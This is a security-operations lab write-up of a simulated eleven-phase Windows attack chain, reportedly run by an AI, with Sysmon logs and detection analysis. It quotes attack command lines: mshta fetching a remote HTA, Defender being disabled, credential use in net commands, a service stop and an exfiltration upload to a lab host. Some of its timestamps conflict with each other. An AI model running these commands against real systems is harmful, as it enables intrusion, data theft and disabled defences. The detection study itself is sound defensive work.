# AGC-080 — Full Attack Chain: Discovery to Service Disruption

> **Execution & Documentation Note:** This scenario was executed
> and documented in full by Claude (Anthropic AI), operating
> autonomously on the lab infrastructure. All commands, detection
> analysis, investigation steps, and conclusions in this report
> were performed by AI, not by a human analyst.

## Card

| Field | Value |
|---|---|
| ID | `AGC-080` |
| Title | Full Attack Chain: Discovery to Service Disruption |
| Category | `13-full-attack-chain` — Full Attack Chain |
| Severity | Critical |
| MITRE Technique | T1566.002, T1218.005, T1574.001, T1482, T1003.002, T1550.002, T1102.002, T1039, T1567.002, T1562.001, T1489 |
| Verdict | True Positive |
| Confidence | High |
| Chain | ◀ [AGC-079](../AGC-079-full-chain-dmz-pivot-to-defacement/README.md) · next [AGC-081](../../14-false-positive/AGC-081-encoded-ps-backup/README.md) ▶ |

## Attacker Perspective

### Simulation

11-phase attack chain on COMPROMISED-HOST-01, distinguished from the other three full-chain scenarios by an intentionally extended, spaced-out discovery phase designed to test whether volume/frequency-based detection catches slow enumeration. The final impact is pure availability disruption (service stop) — no data destruction or ransomware.

**Execution window**: 00:21:11 - 00:29:09 UTC (approximately 8 minutes)
**Discovery phase**: 00:26:37 - 00:27:17 UTC (~40 seconds, 5 commands spaced 8 seconds apart)

This is the fourth and final full attack chain scenario (after AGC-077, AGC-078, AGC-079).

## SOC Perspective

### Detection

Composite alert: Windows Push Notification Service (WpnService) stopped unexpectedly on COMPROMISED-HOST-01. Backward investigation reveals an 11-phase attack chain with extended discovery that preceded the service disruption, traced through mshta.exe proxy execution, SAM credential extraction attempt, lateral movement, and web-service-shaped C2/exfiltration.

### Investigation

#### Phase 1: Initial Access — QR Code Phishing (T1566.002)

QR-code-delivered phishing link directed michael.chen to a credential harvesting page at `updates.ashfordgrove-it.local` (resolving to 10.10.40.10). The delivery mechanism (QR image in email) differs from AGC-077/078/079's clickable links, but the network behavior is identical.

**Sysmon EID 22 — DNS Query:**
```
UtcTime: 2026-09-16 00:22:29.138
ProcessId: 3236
QueryName: updates.ashfordgrove-it.local
QueryStatus: 0
QueryResults: 10.10.40.10;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: COMPROMISED-01\Administrator
```

**Sysmon EID 3 — HTTP GET (phishing page):**
```
UtcTime: 2026-09-16 00:22:29.174
ProcessId: 3236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Protocol: tcp
SourceIp: 10.10.10.103
SourcePort: 65440
DestinationIp: 10.10.40.10
DestinationPort: 80
```

**Sysmon EID 3 — HTTP POST (credential submission):**
```
UtcTime: 2026-09-16 00:22:29.198
ProcessId: 3236
SourceIp: 10.10.10.103
SourcePort: 65441
DestinationIp: 10.10.40.10
DestinationPort: 80
```

HTTP GET returned 1446 bytes. POST submitted QR-session token with michael.chen credentials.

#### Phase 2: Execution — Mshta Proxy Execution (T1218.005)

Used mshta.exe (signed Microsoft binary) to fetch and execute a remote HTA file:

**Sysmon EID 1 — Process Create:**
```
UtcTime: 2026-09-16 00:21:14.101
ProcessId: 1320
Image: C:\Windows\System32\mshta.exe
CommandLine: "C:\WINDOWS\system32\mshta.exe" http://10.10.40.10/stage2.hta
User: COMPROMISED-01\Administrator
```

**Sysmon EID 3 — Outbound HTTP (HTA fetch):**
```
UtcTime: 2026-09-16 00:22:32.161
ProcessId: 1320
Image: C:\Windows\System32\mshta.exe
Protocol: tcp
SourceIp: 10.10.10.103
SourcePort: 65442
DestinationIp: 10.10.40.10
DestinationPort: 80
```

Mshta.exe successfully started and fetched from the remote URL. The process was killed after ~5 minutes (it opened a GUI dialog on the headless VM). The key evidence is the process creation with a remote URL argument — a classic signed-binary proxy execution pattern.

#### Phase 3: Privilege Escalation — DLL Search Order Hijacking (T1574.001)

Planted a malicious DLL (`version.dll`) in an application directory to hijack DLL loading:

```
Planted version.dll at C:\Windows\Temp\VulnApp\
09/16/2026  12:26 AM                42 version.dll
```

**Detection gap**: Sysmon EID 7 (Image Loaded) is **DISABLED** in the SwiftOnSecurity configuration. This means DLL hijacking would be invisible to current Sysmon monitoring. This is a legitimate detection gap that should be documented and addressed through configuration tuning — either enabling EID 7 with targeted rules for known hijack paths, or using alternative detection (file integrity monitoring on application directories).

**EID 1 evidence of file placement:**
```
UtcTime: 2026-09-16 00:26:35.188
ProcessId: 1232
Image: C:\Windows\System32\cmd.exe
CommandLine: "C:\WINDOWS\system32\cmd.exe" /c "dir C:\Windows\Temp\VulnApp\version.dll"
```

#### Phase 4: Discovery — Domain Trust and AD Enumeration (T1482)

Extended discovery phase with commands deliberately spaced ~8 seconds apart to simulate slow, careful enumeration that blends with administrative noise:

**Sub-phase 4a — nltest (00:26:37):**
```
UtcTime: 2026-09-16 00:26:37.261
ProcessId: 5456
Image: C:\Windows\System32\nltest.exe
CommandLine: "C:\WINDOWS\system32\nltest.exe" /domain_trusts
```
Result: `ASHFORDGROVE ashfordgrove.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)`

**Sub-phase 4b — systeminfo (00:26:45):**
```
UtcTime: 2026-09-16 00:26:45.354
ProcessId: 240
Image: C:\Windows\System32\systeminfo.exe
CommandLine: "C:\WINDOWS\system32\systeminfo.exe"
```

**Sub-phase 4c — net group /domain (00:26:55):**
```
UtcTime: 2026-09-16 00:26:55.875
ProcessId: 572
Image: C:\Windows\System32\net.exe
CommandLine: "C:\WINDOWS\system32\net.exe" group /domain
```
Returned 16 domain groups including Domain Admins, IT-Support, Employees-Group.

**Sub-phase 4d — net user /domain (00:27:04):**
```
UtcTime: 2026-09-16 00:27:04.049
ProcessId: 2304
Image: C:\Windows\System32\net.exe
CommandLine: "C:\WINDOWS\system32\net.exe" user /domain
```
Returned all domain users: Administrator, Guest, krbtgt, michael.chen, raj.patel, sarah.jenkins.

**Sub-phase 4e — net localgroup Administrators (00:27:12):**
```
UtcTime: 2026-09-16 00:27:12.173
ProcessId: 5544
Image: C:\Windows\System32\net.exe
CommandLine: "C:\WINDOWS\system32\net.exe" localgroup Administrators
```
Returned: Administrator, ASHFORDGROVE\Domain Admins, wadmin.

**Detection note**: The 8-second spacing between commands is designed to evade burst-detection rules that trigger on rapid-fire enumeration. A default investigation window of 5-10 minutes would catch all of these, but narrower real-time detection thresholds may miss them. This is the key tuning insight from this scenario.

#### Phase 5: Credential Access — SAM Dump (T1003.002)

Attempted to save SAM and SYSTEM registry hives for offline credential extraction:

**Sysmon EID 1 — cmd.exe for directory check (post-dump):**
```
UtcTime: 2026-09-16 00:27:17.744
ProcessId: 2916
Image: C:\Windows\System32\cmd.exe
CommandLine: "C:\WINDOWS\system32\cmd.exe" /c "dir C:\Windows\Temp\sam.save C:\Windows\Temp\system.save"
```

**Result**: Access denied. The reg.exe process was blocked before execution (no EID 1 for reg.exe itself), indicating that Windows 11 protection mechanisms prevented the SAM hive export. In production, successful SAM dump would generate EID 1 for `reg.exe save HKLM\SAM` — one of the highest-fidelity indicators in the catalog, as legitimate administrative activity rarely saves these hives to disk.

#### Phase 6: Lateral Movement — Pass the Hash (T1550.002)

Attempted NTLM authentication to WIN-CLIENT-02 using credentials:

**Sysmon EID 1 — net.exe with cleartext credentials:**
```
UtcTime: 2026-09-16 00:27:20.810
ProcessId: 2400
Image: C:\Windows\System32\net.exe
CommandLine: "C:\WINDOWS\system32\net.exe" use \\10.10.10.102\IPC$ /user:wadmin [REDACTED]
```

**Result**: System error 64 — "The specified network name is no longer available." The connection to WIN-CLIENT-02 timed out. In production, successful PtH would generate Security EID 4624 Type 3 with `LogonProcessName=NtLmSsp` and no corresponding interactive logon evidence — the diagnostic absence that distinguishes PtH from password-based logon.

**Note**: The cleartext password `[REDACTED]` is visible in the Sysmon EID 1 command line. In a real credential-dumping scenario, the NTLM hash would be used instead, but the network behavior would be identical.

#### Phase 7: Command and Control — Web Service (T1102.002)

Four web-service-shaped C2 polling requests at 3-second intervals:

**Sysmon EID 3 — C2 Polling (4 connections to port 443):**
```
Poll 1: [00:28:06] -> 10.10.40.10:443 (port 65498) - SUCCESS (1446 bytes)
Poll 2: [00:28:09] -> 10.10.40.10:443 (port 65499) - SUCCESS (1446 bytes)
Poll 3: [00:28:12] -> 10.10.40.10:443 (port 65500) - SUCCESS (1446 bytes)
Poll 4: [00:28:15] -> 10.10.40.10:443 (port 65502) - SUCCESS (1446 bytes)
```

The URL structure (`/api/v1/paste/fetch?id=<random>`) is designed to resemble legitimate cloud/paste service traffic. Detection requires behavioral analysis (polling frequency + payload size consistency) rather than reputation-based filtering, since the URL structure would not trigger domain/IP reputation rules.

#### Phase 8: Collection — Network Shared Drive (T1039)

Collected sensitive data files (simulated — DC network share unreachable from CH-01):

```
C:\Windows\Temp\collected\hr_records.csv (90 bytes) -- employee PII
C:\Windows\Temp\collected\finance_q3.xlsx.txt (33 bytes) -- financial data
C:\Windows\Temp\collected\admin_passwords.txt (55 bytes) -- credential file
```

**Lab constraint**: Direct copy from `\\10.10.10.10\SharedDocs` not possible (DC unreachable from CH-01). Synthetic files planted to demonstrate collection behavior.

#### Phase 9: Exfiltration — Web Service Upload (T1567.002)

Compressed collected files and exfiltrated via the same web service channel:

```
Archive created: collected.zip (520 bytes)
POST exfil: SUCCESS (520 bytes uploaded to https://10.10.40.10/api/v1/paste/create)
```

**Sysmon EID 3 — Exfil POST:**
```
UtcTime: 2026-09-16 00:29:41.094
ProcessId: 3236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
SourceIp: 10.10.10.103
SourcePort: 65503
DestinationIp: 10.10.40.10
DestinationPort: 443
```

The volume anomaly (520 bytes uploaded vs 1446 bytes received per poll) is subtle but detectable through payload size analysis on the same channel identified in Phase 7.

#### Phase 10: Defense Evasion — Disable Windows Defender (T1562.001)

```
Defender real-time monitoring: DISABLED
```

`Set-MpPreference -DisableRealtimeMonitoring $true` succeeded. No Defender EID 5001 event was captured in the event log within the 10-minute collection window.

**Critical note**: This action occurred on COMPROMISED-HOST-01 (the origin host), NOT on the lateral movement destination. A careless investigation could misattribute this to the wrong host if not tracking per-host phase mapping carefully.

#### Phase 11: Impact — Service Stop (T1489)

Stopped the Windows Push Notification Service to demonstrate availability impact:

**Sysmon EID 1 — sc.exe stop:**
```
UtcTime: 2026-09-16 00:28:29.057
ProcessId: 1304
Image: C:\Windows\System32\sc.exe
CommandLine: "C:\WINDOWS\system32\sc.exe" stop WpnService
```

Service transitioned from Running to Stopped (STATE: 3 STOP_PENDING, then confirmed Stopped).

**Detection gap**: Windows 11 build 26100 does NOT generate EID 7036 (Service Control Manager state change events). This confirmed gap (also observed in AGC-073, AGC-078) means service stop detection relies entirely on Sysmon EID 1 for the sc.exe command, not on the service event itself.

### Report

AGC-080 demonstrates how an attacker can achieve significant impact (service disruption + data exfiltration) while maintaining a deliberately low-profile discovery phase. The 40-second spaced enumeration window falls below most burst-detection thresholds, and three detection gaps compound the challenge:

1. **EID 7 disabled**: DLL hijacking is invisible to Sysmon
2. **EID 7036 absent on Windows 11**: Service stop detection depends entirely on EID 1 for sc.exe
3. **EID 5001 not generated**: Defender disable left no event log trail

**Confidence is High (not Critical)** because the discovery phase evidence — while present in Sysmon EID 1 — is reconstructed retrospectively from later-stage indicators. In real-time, the spaced enumeration would likely blend with normal administrative activity. The confidence comes from the later phases (mshta execution, C2 polling pattern, service stop), not from catching the discovery as it happened.

**Cross-reference**: This is the final full attack chain (after AGC-077, AGC-078, AGC-079). Techniques reused from: AGC-013 (mshta execution), AGC-037 (domain trust discovery), AGC-031 (SAM credential access), AGC-073 (service disruption).

### MITRE Mapping

| Technique ID | Name                                    | Tactic               | Confidence |
|-------------|------------------------------------------|----------------------|------------|
| T1566.002   | Spearphishing Link (QR delivery)         | Initial Access       | Critical   |
| T1218.005   | Mshta                                    | Execution            | Critical   |
| T1574.001   | DLL Search Order Hijacking               | Privilege Escalation | Medium     |
| T1482       | Domain Trust Discovery                   | Discovery            | High       |
| T1003.002   | SAM                                      | Credential Access    | Medium     |
| T1550.002   | Pass the Hash                            | Lateral Movement     | High       |
| T1102.002   | Web Service: Bidirectional Communication | Command and Control  | Critical   |
| T1039       | Data from Network Shared Drive           | Collection           | High       |
| T1567.002   | Exfiltration to Cloud Storage            | Exfiltration         | Critical   |
| T1562.001   | Disable or Modify Tools                  | Defense Evasion      | High       |
| T1489       | Service Stop                             | Impact               | Critical   |

## Attacker vs Analyst Timeline

| Time (UTC)    | Attacker Phase                      | Analyst Detection Opportunity                           |
|---------------|-------------------------------------|---------------------------------------------------------|
| 00:21:11      | QR phishing + credential harvest    | EID 22: anomalous domain; EID 3: HTTP to external IP   |
| 00:21:14      | Mshta proxy execution               | EID 1: mshta.exe with remote URL argument               |
| 00:26:35      | DLL hijack (file placement)         | **BLIND** — EID 7 disabled; no Sysmon visibility      |
| 00:26:37      | nltest /domain_trusts               | EID 1: nltest.exe (start of discovery window)           |
| 00:26:45      | systeminfo                          | EID 1: systeminfo.exe (8s gap from nltest)              |
| 00:26:55      | net group /domain                   | EID 1: net.exe group enumeration                        |
| 00:27:04      | net user /domain                    | EID 1: net.exe user enumeration                         |
| 00:27:12      | net localgroup Administrators       | EID 1: net.exe localgroup (end of discovery window)     |
| 00:27:17      | SAM/SYSTEM hive save attempt        | EID 1: cmd.exe dir for dump files (reg.exe blocked)     |
| 00:27:20      | Pass-the-hash to WIN-CLIENT-02      | EID 1: net.exe use with cleartext creds in command line |
| 00:28:06-15   | Web-service C2 polling (4x)         | EID 3: periodic HTTPS to external IP                    |
| 00:28:20      | Data collection + archive           | EID 1: cmd.exe dir; process-level file activity         |
| 00:28:22      | Exfiltration via web service POST   | EID 3: volume anomaly on same C2 channel                |
| 00:28:26      | Disable Defender                    | No EID 5001 captured; detection gap                     |
| 00:28:29      | Service stop (WpnService)           | EID 1: sc.exe stop; no EID 7036 (Win11 gap)            |

**Key insight**: The ~5 minute gap between Phase 2 (mshta at 00:21:14) and Phase 3-4 (discovery starting at 00:26:35) is partly due to mshta blocking (GUI dialog on headless VM), but in a real attack this pause would represent the attacker settling in before beginning enumeration. An analyst who only investigates the last few minutes before the service stop would miss the initial access entirely.

## Mock Escalation

**To**: SOC L2 / Incident Response
**Priority**: P1 — Multi-Phase Compromise with Active Service Disruption
**Summary**: An 11-phase attack chain on COMPROMISED-HOST-01 has been traced from QR-code phishing through extended AD enumeration to service disruption. The attack demonstrates a deliberate slow-enumeration approach designed to evade burst-detection rules.

**Key findings**:
1. QR-delivered credential phishing via `updates.ashfordgrove-it.local`
2. Mshta.exe proxy execution (signed-binary abuse, T1218.005)
3. DLL search order hijack planted but **invisible** to Sysmon (EID 7 disabled)
4. Spaced-out AD enumeration (nltest, net group/user/localgroup over ~40 seconds)
5. SAM credential dump attempted (blocked by OS protection)
6. Lateral movement attempt to WIN-CLIENT-02 via net use with cleartext creds in command line
7. Web-service-shaped C2 channel mimicking paste API (4 polls + 1 exfil POST)
8. Windows Defender disabled on origin host (no EID 5001 logged)
9. WpnService stopped (availability impact)

**Systemic recommendation** (highest priority):
Review and tighten AD enumeration logging/alerting thresholds. The near-zero real-time visibility of the discovery phase is the most actionable systemic gap this incident reveals — more so than any individual technical control. Specifically:
- Enable advanced audit logging for Directory Service Access
- Configure detection rules for spaced enumeration (lower threshold, wider time window)
- Enable Sysmon EID 7 with targeted rules for known DLL hijack paths
- Investigate why Defender EID 5001 was not generated despite successful disable

## Evidence

Screenshots: none in phase one (text evidence only); added when this scenario is re-executed by hand in phase two.
